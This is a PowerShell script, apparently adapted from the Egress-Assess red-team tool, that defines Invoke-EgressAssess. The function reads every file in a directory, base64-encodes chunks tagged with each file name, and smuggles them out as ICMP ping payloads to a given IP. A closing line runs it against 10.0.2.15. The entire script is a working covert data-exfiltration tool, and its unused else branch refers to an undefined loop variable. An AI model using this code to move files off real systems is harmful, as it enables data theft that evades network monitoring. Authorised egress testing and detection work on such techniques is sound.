function Invoke-EgressAssess
{
 
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $False)]
        [string]$Client,
        [Parameter(Mandatory = $True)]
        [string]$IP,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [string]$Datatype
    )
    begin
    {
        #stop looping errors
        $ErrorActionPreference = "Stop"

        function Use-ICMP
        {
      if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
            $filetransfer = $true
            $FinalDestination = $IP
            $ByteReader = 0
            $PacketNumber = 1
            $bufferSize = 1050
            $Timeout = 1000

            if ($FileTransfer -eq $True)
            {
                $Delimiter = '.:::-989-:::.'
                $SourceFiles = Get-ChildItem $Datatype | Where-Object { -not $_.PSIsContainer }
 
                foreach ($SourceFile in $SourceFiles) {
                    $SourceFilePath = $SourceFile.FullName
                    $FileName = $SourceFile.Name
                    $NameBytes = [System.Text.Encoding]::UTF8.GetBytes($FileName)
                    $DelimiterBytes = [System.Text.Encoding]::UTF8.GetBytes($Delimiter)
                    $reader = [System.IO.File]::OpenRead($SourceFilePath)
                    $TotalPackets = [int]($reader.Length / $bufferSize)
                    $bytesRead = 0
                    $PacketNumber = 1
                    do
                    {
                        $buffer = New-Object byte[] $bufferSize
                        $bytesRead = $reader.Read($buffer, 0, $bufferSize)
                        $EncodedData = [Convert]::ToBase64String($NameBytes + $DelimiterBytes + $buffer)
                        $Encoder = [system.Text.Encoding]::UTF8
                        $Buffer = $Encoder.GetBytes($EncodedData)
                        $Ping = New-Object -TypeName System.Net.NetworkInformation.Ping
                        Write-Verbose "[*] Sending packet $PacketNumber/$TotalPackets for file: $($SourceFile.Name)"
                        $PingReply = $Ping.Send($FinalDestination, $Timeout, $Buffer)
                        $buffer = ''
                        $PacketNumber++
                    }
                    while ($bytesRead -eq $bufferSize)
                    $reader.Dispose()
                }
                Write-Verbose "[*] File transfer complete!"
            }
            else
            {
                # Implement sending data via ICMP for all files in the directory
                $SourceFiles = Get-ChildItem $Datatype | Where-Object { -not $_.PSIsContainer }
                foreach ($SourceFile in $SourceFiles) {
                    $ICMPData = Get-Content $SourceFile.FullName
                    Do
                    {
                        try
                        {
                            Write-Verbose "[*] Sending data via ICMP for file: $($SourceFile.Name)"
                            [int]$TotalPackets = ($ICMPData.Length / $bufferSize)
                            While ($ByteReader -le ($ICMPData.Length - $bufferSize))
                            {
                                Write-Verbose "[*] Sending $PacketNumber of $TotalPackets packets for file: $($SourceFile.Name)"
                                $DataToSend = $ICMPData.Substring($ByteReader, $bufferSize)
                                $Encoder = [system.Text.Encoding]::UTF8
                                $DataBytes = $Encoder.GetBytes($DataToSend)
                                $EncodedData = [System.Convert]::ToBase64String($DataBytes)
                                $Buffer = $Encoder.GetBytes($EncodedData)
                                $Ping = New-Object -TypeName System.Net.NetworkInformation.Ping
                                $PingReply = $Ping.Send($FinalDestination, $Timeout, $Buffer)
                                $ByteReader += $bufferSize
                                $PacketNumber++
                            }
                        }
                        catch
                        {
                            $ErrorMessage = $_.Exception.Message
                            Write-Verbose "[*] Error, transfer failed with error:"
                            Write-Verbose $ErrorMessage
                            Break
                        }
                        Write-Verbose "[*] Transfer complete for file: $($SourceFile.Name)"
                        $ByteReader = 0
                        $PacketNumber = 0
                        $loops--
                        Write-Verbose "[*] $loops loops remaining.."
                    }
                    While ($Loops -gt 0)
                }
            }
        }
    }
    process
    {
    if ($client -eq "icmp")
        {
            Use-ICMP
        }
    }
    end
    {
        [System.GC]::Collect()
        Write-Verbose "[*] Exiting.."
    }
}
 
Invoke-EgressAssess -client icmp -ip 10.0.2.15 -Datatype 'your_directory_path_here' -Verbose
